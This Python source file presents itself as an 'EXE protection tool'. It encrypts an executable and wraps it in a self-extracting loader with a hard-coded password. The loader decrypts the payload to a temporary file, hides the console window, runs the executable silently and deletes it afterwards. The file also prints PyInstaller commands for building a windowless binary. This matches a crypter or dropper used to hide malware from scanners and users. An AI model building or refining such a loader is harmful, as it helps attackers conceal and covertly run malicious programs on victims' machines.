import os
import sys
import base64
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argparse
import uuid
import tempfile
import subprocess
import ctypes

def generate_key(password, salt=None):
    """Generate a Fernet key from a password and salt."""
    if salt is None:
        salt = os.urandom(16)
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key, salt

def encrypt_file(input_file, output_file, password, hide_console=True):
    """Encrypt the input file with the given password."""
    try:
        # Generate a key using the password
        key, salt = generate_key(password)
        cipher = Fernet(key)
        
        # Read the input file
        with open(input_file, 'rb') as f:
            data = f.read()
        
        # Encrypt the data
        encrypted_data = cipher.encrypt(data)
        
        # Generate a unique identifier for this encrypted file
        file_id = str(uuid.uuid4())
        
        # Create a self-extracting header
        header = f"""#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Protected by ExeCryptor
# File ID: {file_id}

import os
import sys
import base64
import tempfile
import subprocess
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

# For hiding console window
def hide_console():
    if sys.platform.startswith('win'):
        # Windows-specific: Hide the console window
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_HIDE = 0
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, SW_HIDE)

# The encrypted data and salt will be appended here
SALT = {salt}
ENCRYPTED_DATA = "{base64.b64encode(encrypted_data).decode()}"
HIDE_CONSOLE = {str(hide_console).lower()}

def main():
    # Hide console window if specified
    if HIDE_CONSOLE:
        hide_console()
        
    password = "{password}"  # Hard-coded password for automated execution
    
    key = generate_key(password, SALT)
    cipher = Fernet(key)
    
    try:
        # Decrypt the data
        decrypted_data = cipher.decrypt(base64.b64decode(ENCRYPTED_DATA))
        
        # Create a temporary file for the executable
        fd, temp_exe = tempfile.mkstemp(suffix='.exe')
        os.close(fd)
        
        # Write the decrypted data to the temporary file
        with open(temp_exe, 'wb') as f:
            f.write(decrypted_data)
        
        # Make the file executable
        os.chmod(temp_exe, 0o755)
        
        # Execute the file with the original arguments
        if HIDE_CONSOLE and sys.platform.startswith('win'):
            # Use Windows-specific process creation with hidden window
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            process = subprocess.Popen(
                [temp_exe] + sys.argv[1:],
                shell=False,
                startupinfo=startupinfo
            )
        else:
            # Standard process creation
            process = subprocess.Popen([temp_exe] + sys.argv[1:], shell=False)
            
        process.wait()
        
        # Clean up
        os.unlink(temp_exe)
        
    except Exception as e:
        print(f"Error: {{e}}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
"""
        
        # Write the encrypted file with the self-extracting header
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(header)
        
        print(f"[+] File encrypted: {output_file}")
        print(f"[+] Password: {password}")
        print(f"[+] Build commands:")
        print(f"    - With console: python -m PyInstaller --onefile {output_file}")
        print(f"    - Without console: python -m PyInstaller --onefile --noconsole {output_file}")
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Advanced EXE protection tool')
    parser.add_argument('input_file', help='Input file to protect')
    parser.add_argument('output_file', help='Output file path')
    parser.add_argument('--password', help='Custom encryption password')
    parser.add_argument('--hide-console', action='store_true', help='Hide console window')
    
    args = parser.parse_args()
    
    if not os.path.isfile(args.input_file):
        print(f"[-] Error: File '{args.input_file}' not found.")
        return 1
    
    password = args.password
    if not password:
        password = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
    
    success = encrypt_file(args.input_file, args.output_file, password, args.hide_console)
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main()) 